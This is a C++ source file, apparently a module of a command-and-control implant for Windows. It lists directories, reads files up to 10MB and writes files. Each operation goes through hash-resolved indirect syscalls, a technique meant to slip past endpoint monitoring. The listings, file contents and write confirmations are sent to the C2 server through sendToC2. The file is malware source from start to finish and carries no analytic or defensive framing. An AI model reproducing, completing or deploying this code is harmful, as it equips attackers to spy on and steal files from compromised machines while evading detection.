#include "Modules/file_io.h"
#include "Core/syscalls.h"
#include "Crypto/obfuscation.h"
#include "Crypto/hashing.h"
#include "Network/c2_server.h"
#include "Utils/helpers.h"
#include <string>
#include <cstring>

//internal dir
void Internal_Dir(const wchar_t* directoryPath) {
    HANDLE hFile;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;

    mRtlInitUnicodeString(&uPath, directoryPath); 
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //NtOpenFile
    gate = GetSSNByHash(0X441098F16BE8639); 
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)FILE_LIST_DIRECTORY | SYNCHRONIZE, (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)FILE_SHARE_READ | FILE_SHARE_WRITE, (ULONG_PTR)FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 0,0,0,0,0);

    if (status != 0) return;

    //NtQueryDirectoryFile
    BYTE buffer[32768];
    gate = GetSSNByHash(0X9E7A17C949799D92);
    PREPARE_SYSCALL(gate);

    //FileBothDirectoryInformation
    status = IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)&ioStatus, (ULONG_PTR)buffer, (ULONG_PTR)sizeof(buffer), (ULONG_PTR)3, (ULONG_PTR)FALSE, (ULONG_PTR)NULL, (ULONG_PTR)FALSE);

    if (status == 0) {
        PFILE_BOTH_DIR_INFORMATION pDirInfo = (PFILE_BOTH_DIR_INFORMATION)buffer;
        std::wstring fileList = L"Contents of " + std::wstring(directoryPath) + L":\n";

        while (TRUE) {
            // copy filename
            wchar_t fileName[MAX_PATH] = {0};
            wcsncpy(fileName, pDirInfo->FileName, pDirInfo->FileNameLength / sizeof(WCHAR));
            
            fileList += std::wstring(fileName) + L"\n";

            if (pDirInfo->NextEntryOffset == 0) break;
            pDirInfo = (PFILE_BOTH_DIR_INFORMATION)((BYTE*)pDirInfo + pDirInfo->NextEntryOffset);
        }

        sendToC2(WStringToString(fileList).c_str());
    }

    //NtClose
    gate = GetSSNByHash(0X4F3163BAF74EFD5D);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0,0,0,0,0);
}

//internal read
void Internal_Read(const wchar_t* filePath) {
    HANDLE hFile;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;

    const SIZE_T MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB cap

    mRtlInitUnicodeString(&uPath, filePath);
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    gate = GetSSNByHash(0X441098F16BE8639);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)FILE_GENERIC_READ | SYNCHRONIZE, (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)FILE_SHARE_READ, (ULONG_PTR)FILE_SYNCHRONOUS_IO_NONALERT, 0, 0, 0, 0, 0);

    if (status != 0) return;

    std::string content;
    BYTE buffer[4096];
    LARGE_INTEGER offset;
    offset.QuadPart = 0;

    while (true) {
        memset(buffer, 0, sizeof(buffer));
        memset(&ioStatus, 0, sizeof(ioStatus));

        gate = GetSSNByHash(0X44109A982B9D103);
        PREPARE_SYSCALL(gate);
        
        status = IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)&ioStatus, (ULONG_PTR)buffer, (ULONG_PTR)sizeof(buffer) - 1, (ULONG_PTR)&offset, (ULONG_PTR)NULL, 0, 0);

        if (status != 0 && status != 0x00000103) break; // not SUCCESS or STATUS_PENDING
        if (ioStatus.Information == 0) break; // no bytes read (EOF)

        content.append((char*)buffer, ioStatus.Information);
        offset.QuadPart += ioStatus.Information;

        // 10MB file size cap
        if (content.size() >= MAX_FILE_SIZE) {
            content.append(STR("\n[...truncated at 10MB limit]"));
            break;
        }
    }

    if (!content.empty()) {
        std::string formattedMsg = "File Content:\n```\n" + content + "\n```";
        sendToC2(formattedMsg.c_str()); 
    }

    // NtClose
    gate = GetSSNByHash(0X4F3163BAF74EFD5D);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}


//internal write
void Internal_Write(const wchar_t* filePath, const char* data) {
    HANDLE hFile;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;

    mRtlInitUnicodeString(&uPath, filePath);
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // NtCreateFile
    gate = GetSSNByHash(0X18A7B1B2FB2E2AFB);
    PREPARE_SYSCALL(gate);
    
    status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)FILE_GENERIC_WRITE | SYNCHRONIZE, (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)NULL, (ULONG_PTR)FILE_ATTRIBUTE_NORMAL, (ULONG_PTR)0, (ULONG_PTR)FILE_OVERWRITE_IF, (ULONG_PTR)FILE_SYNCHRONOUS_IO_NONALERT, (ULONG_PTR)NULL, (ULONG_PTR)0);

    if (status != 0) return;

    gate = GetSSNByHash(0X8C6245C2AEFC20D2);
    PREPARE_SYSCALL(gate);
    
    status = IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)&ioStatus, (ULONG_PTR)data, (ULONG_PTR)strlen(data), (ULONG_PTR)NULL, (ULONG_PTR)NULL, 0, 0);

    if (status == 0) {
        sendToC2(STR("Data written successfully to file."));
    }

    // NtClose
    gate = GetSSNByHash(0X4F3163BAF74EFD5D);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}
